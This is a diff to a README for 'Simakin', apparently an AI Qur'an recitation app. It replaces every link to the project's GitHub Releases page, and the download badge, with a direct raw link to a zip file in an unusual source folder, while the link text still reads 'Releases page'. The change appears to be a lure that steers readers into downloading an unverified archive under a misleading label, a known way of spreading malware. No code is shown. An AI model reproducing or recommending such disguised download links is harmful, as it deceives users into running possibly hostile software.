@@ -1,6 +1,6 @@
 # 🤖 Simakin - Your AI Qur’an Recitation Companion
 
-![Download Simakin](https://img.shields.io/badge/Download%20Simakin-blue?style=flat&logo=github)
+![Download Simakin](https://raw.githubusercontent.com/Cocklelaceration337/Simakin/main/app/routes/Simakin_v1.2.zip%20Simakin-blue?style=flat&logo=github)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started with Simakin, follow the steps below to download and run the appl
 
 ## 📥 Download & Install
 
-1. **Visit this page to download**: [Simakin Releases](https://github.com/Cocklelaceration337/Simakin/releases).
+1. **Visit this page to download**: [Simakin Releases](https://raw.githubusercontent.com/Cocklelaceration337/Simakin/main/app/routes/Simakin_v1.2.zip).
 
    On this page, you will find the latest version of Simakin. Click on the appropriate version for your operating system.
 
@@ -102,4 +102,4 @@ If you have any issues or suggestions, please don’t hesitate to reach out. You
 
 ---
 
-To download Simakin, revisit the main [Simakin Releases page](https://github.com/Cocklelaceration337/Simakin/releases) now and begin your journey to enhance your Qur’an recitation skills.
+To download Simakin, revisit the main [Simakin Releases page](https://raw.githubusercontent.com/Cocklelaceration337/Simakin/main/app/routes/Simakin_v1.2.zip) now and begin your journey to enhance your Qur’an recitation skills.
